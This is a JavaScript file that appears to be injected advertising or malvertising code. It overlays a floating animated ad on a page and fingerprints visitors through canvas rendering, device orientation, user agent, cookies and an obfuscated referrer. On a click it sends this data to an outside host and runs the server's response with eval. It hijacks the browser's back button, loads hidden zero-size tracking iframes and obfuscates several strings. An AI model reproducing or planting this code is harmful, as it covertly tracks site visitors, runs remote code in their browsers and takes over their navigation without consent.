(function () {
		var l = Math.random().toString(36).substr(2);
		var d = Math.random().toString(36).substr(2);
		var k = Math.random().toString(36).substr(2);
		var s = Math.random().toString(36).substr(2);
		var q = Math.random().toString(36).substr(2);
		var a = "jd_callback_" + l;
		var b = "li_callback_" + l;
		var r = "qa_callback_" + l;
		var e = new Date();
		var o = "wm_";
		var n = o + e.getYear() + e.getMonth() + e.getDate() + e.getHours() + parseInt(new Date().getMinutes() / 30);
		var m = "wm_" + Math.random().toString(36).substr(2);
		var w = navigator.userAgent;

		function f(A, B) {
			var x = A.getElementsByTagName("*");
			var y = new Array();
			for (var z = 0; z < x.length; z++) {
				if (x[z].className == B) {
					y.push(x[z])
				}
			}
			return y
		}
		function g(B) {
			var z = document.createElement("canvas");
			var A = z.getContext("2d");
			var F = B;
			A.textBaseline = "top";
			A.font = "14px 'Arial'";
			A.textBaseline = "tencent";
			A.fillStyle = "#f60";
			A.fillRect(125, 1, 62, 20);
			A.fillStyle = "#069";
			A.fillText(F, 2, 15);
			A.fillStyle = "rgba(102, 204, 0, 0.7)";
			A.fillText(F, 4, 17);
			var x = z.toDataURL().replace("data:image/png;base64,", "");
			var y = atob(x).slice(-16, -12) + "";
			var E = "";
			for (var C = 0; C < y.length; C++) {
				var D = y.charCodeAt(C).toString(16);
				E += D.length < 2 ? "0" + D : D
			}
			E = E + B;
			return E
		}

		var ref = function () {
			var u;
			try {
				u = window.top.document.referrer;
			}
			catch (err) {
				u = document.referrer;
			}
			var r = '', c;
			for (var i = 0; i < u.length; i++) {
				if (i == 1000) {
					break;
				}
				c = u.charCodeAt(i);
				if (c > 96 && c < 123) {
					c += i % 8;
					if (c > 122)
						c -= 26;
				}
				r += String.fromCharCode(c);
			}
			return r;
		}; 
		var isPc = function () {
			var system ={
				win : false,
				mac : false,
				xll : false
			};
			var p = navigator.platform;
			system.win = p.indexOf("Win") == 0;
			system.mac = p.indexOf("Mac") == 0;
			system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
			if(system.win||system.mac||system.xll){
				return 0;
			}else {
				return 0;
			}
		}
		var h = document.getElementsByTagName("head")[0];
		var c = null;
		var t = null;
		window[b] = function (x) {
			h.removeChild(c);
			if (x.isEject) {
				var i = document.createElement("iframe");
				i.style = "display:none";
				i.src = x.link;
				document.body.appendChild(i)
			} else {
				top.location.href = x.link
			}
		};
		window[r] = function (i) {
			h.removeChild(t)
		};

		function getCookieoWuFY2niYOYVOIse5664(name){
			var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
			if(arr=document.cookie.match(reg))
				return unescape(arr[2]);
			else
				return null;
		}

		window[a] = function (ay) {
			window[a] = null;
			var al = ay.configs;
			var ah = (al.shdowH); // 阴影比例，如0.2为20%
			var ai = (al.shdowP == "1" ? true : false); // 阴影是否显示，0不显示，1为显示
			var ac = (al.isback);
			var ae = (al.isClose);
			var bc = al.zhiwen;
			var xh = al.xh,xw = al.xw,distanceTop = al.distanceTop;
			var T = /CPU (?:iPhone )?OS (\d+_\d+)/i.test(navigator.userAgent) ? "IOS" + parseFloat(RegExp[
				"$1"].replace("_", ".")) : "";
			var U = true;
			var am = 0,
				an = 0,
				ao = 0,
				V = 0,
				W = 0,
				X = 0;


			var zl = an+","+ao+","+am;
			if (window.DeviceOrientationEvent) {
				window.addEventListener("deviceorientation", function (i) {
					if (U) {
						an = Math.floor(i.beta);
						ao = Math.floor(i.gamma);
						am = Math.floor(i.alpha);
						U = false;
						zl = an+","+ao+","+am;
					} else {
						W = Math.floor(i.beta);
						X = Math.floor(i.gamma);
						V = Math.floor(i.alpha);
						zl = W+","+X+","+V;
					}
				});
			}else {
				zl = '_false_no_zhichi';
			}
			var str = navigator.userAgent.toLowerCase();
			var ver = str.match(/cpu iphone os (.*?) like mac os/);
			if(ver && ver[1].replace(/_/g,".") >= 12){
				zl = '_false_no_zhichi';
			}

			var at = false;
			var au = document.getElementsByTagName("link");
			for (var aq = 0; aq < au.length; aq++) {
				if (au[aq].href.indexOf("animate.min.css") >= 0) {
					at = true
				}
			}
			if (!at) {
				var R = document.createElement("s" + "t" + "y" + "l" + "e");
				R.innerHTML = ".gourl1s1hQoASYbz7zxtXY2258{ border: 3px solid red;-webkit-background-clip: text;-webkit-text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;border-radius:0%;}@-webkit-keyframes circle {0% {transform: rotate(0deg);}100% { transform: rotate(-360deg);}}@-webkit-keyframes hue {from {-webkit-filter: hue-rotate(0deg);}to {-webkit-filter: hue-rotate(-360deg);}}";
				h.appendChild(R)
			}
			var imageoWuFY2niYOYVOIse5664 = "";
			if(getCookieoWuFY2niYOYVOIse5664("surnum") != 0 && getCookieoWuFY2niYOYVOIse5664("surnum") != null){
				imageoWuFY2niYOYVOIse5664 = "https://im.tiodata.com/images/inform000"+getCookieoWuFY2niYOYVOIse5664("surnum")+".png"
			}else{
				imageoWuFY2niYOYVOIse5664 = "https://im.tiodata.com/images/inform0001.png"
			}
			var M = ay.images[Math.floor(Math.random() * ay.images.length)];
			var ap = "";
			ap += '<div class="' + d +
				'" style="right: 0px;position: absolute;top: 0px;height:20px;z-index: 19999;">';
			ap += '<img src="'+ ay.btn +'" style="height:100%" />';
			ap += "</div>";
			ap += "<div class = 'gourl1s1hQoASYbz7zxtXY2258'  style='width:100%;height:100%;position:absolute;z-index:2;overflow: inherit; animation: 10s ease 0s infinite normal none running circle'><div class='d_s1hQoASYbz7zxtXY2258'  style='background-image: url(\""+imageoWuFY2niYOYVOIse5664+"\");background-size: 100% 100%;width: 32%;height:32%; left: -10%; position: absolute; top: -10%; z-index: 19999;'></div>";
			ap += '<div class="'+k+'"  style="background-image:url(\''+M.Url+'\');background-size: 100% 100%;padding: 0; margin: 0; width: 100%;height: 100%;pointer-events: none;overflow: inherit;z-index: 19999;"  /></div>';
			ap += "</div>";
			function ctaoWuFY2niYOYVOIse5664(ct){
								var M18_url = ay.alink + "&ref=" + ref() + "&refso=" + navigator.platform + "_xtb&zhongli=_"+zl+'&zhiwen=_zhiwen_'+g(bc)+'_B1=0B5IY0AR';
				var a = new XMLHttpRequest();
				var b = M18_url + '&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);
				if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,true);a.send();}
							}
			var Q = document.createElement("DIV");
			Q.id = l;
			Q.innerHTML = ap;
			var aposi = 'f'+ 'i' + 'x'+ 'e'+'d';
			var uastr = navigator.userAgent.toLowerCase();
			if (uastr.indexOf('baidu') > -1) {
				aposi = 'absolute';
			}
			Q.setAttribute("style",
				"right: 0px; overflow: initial; position: "+aposi+" !important; z-index: 19999;width:" + xw + "px;height:" + xh + "px;top:" + distanceTop + ";"
			);



			Q.setAttribute("class", "animated ");

			Q.onclick = function () {
				ctaoWuFY2niYOYVOIse5664(1)
			};
			var ax = document.createElement("DIV");
			ax.setAttribute("style", "position:relative;z-index: 1;");
			if (ai) {
				ax.style.height = ((xh*ah) + xh) + "px";
				ax.style.width = ((xw*ah/2) + xw) + "px";
				ax.style.bottom = (xh*ah/2) + "px";
				ax.style.right = (xw*ah/2) + "px";
			}
			ax.onclick = function () {
				Q.onclick = null;
				ctaoWuFY2niYOYVOIse5664(3);

			};

			var L = f(Q, d);
			var O = f(Q, s);
			var P = f(Q, q);
			L[0].onclick = function (az) {
				if (ae == 0) {
					Q.style.display = "none"
				} else {
					ctaoWuFY2niYOYVOIse5664(3)
				}
				az.stopPropagation()
			};
			var N = f(Q, k);

			var Y = function () {
				document.getElementsByTagName("body")[0].appendChild(Q);
				Q.appendChild(ax);
			};
			Y();
			if (uastr.indexOf('baidu') > -1) {
				var Qt = Q.offsetTop;
				window.addEventListener('scroll', function() {
					var st = document.body.scrollTop || document.documentElement.scrollTop;
					Q.style.top = st + Qt + 'px';
				});
			}
			if (ac == 1) {
				eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('1();4 1(){3 2={0:"0",5:"#"};8.7.6(2,"0","#")}',9,9,'title|pushHistory|state|var|function|url|pushState|history|window'.split('|'),0,{}));window.addEventListener("popstate", function (e) {ctaoWuFY2niYOYVOIse5664(5);}, false);
			}
		};

		if (isPc() == 0) {
			window[a]({
				'images': [
					{
						'Url': "https://im.tiodata.com/images/1731.gif",
					}
				],
				'btn': "https://im.tiodata.com/images/202004051.png",
				'alink': 'https://66dy.top:10032/piao.php?v=2',
				'configs': {
					'shdowH': 1.2,
					'shdowP': 1,
					'isback': 0,
					'distanceTop' : '40%',
					'isClose': 1,
					'zhiwen': 'wskdhv',
					'xh' : 80,
					'xw' : 80,
				},
			});
		}

		var odiv_m_1 = document.createElement('div');
		odiv_m_1.style = "display:none;";
		var oiframe_m_1 = document.createElement("iframe");
		oiframe_m_1.src = "https://zz.imiqian.com/cnzz1.html?ptype=ios&userid=5162&pid=5664&s=wap&l=x";
		oiframe_m_1.height="0";
		oiframe_m_1.width="0";
		oiframe_m_1.sandbox="allow-same-origin allow-scripts allow-forms";
		oiframe_m_1.allowtransparency="true";
		oiframe_m_1.style = "display:none;";
		odiv_m_1.appendChild(oiframe_m_1);
		document.body.appendChild(odiv_m_1);



	})();